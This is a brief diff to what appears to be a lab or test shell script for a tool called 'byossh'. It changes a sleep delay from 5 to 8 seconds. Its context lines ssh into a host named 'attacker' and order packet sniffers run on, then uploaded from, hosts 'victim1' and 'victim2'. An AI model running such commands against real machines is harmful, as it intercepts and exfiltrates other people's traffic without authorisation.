@@ -29,7 +29,7 @@ sleep 2
 
 ssh attacker "byossh victim2 packetsniffer run"
 
-sleep 5
+sleep 8
 
 ssh attacker "byossh victim1 packetsniffer upload"
 ssh attacker "byossh victim2 packetsniffer upload"
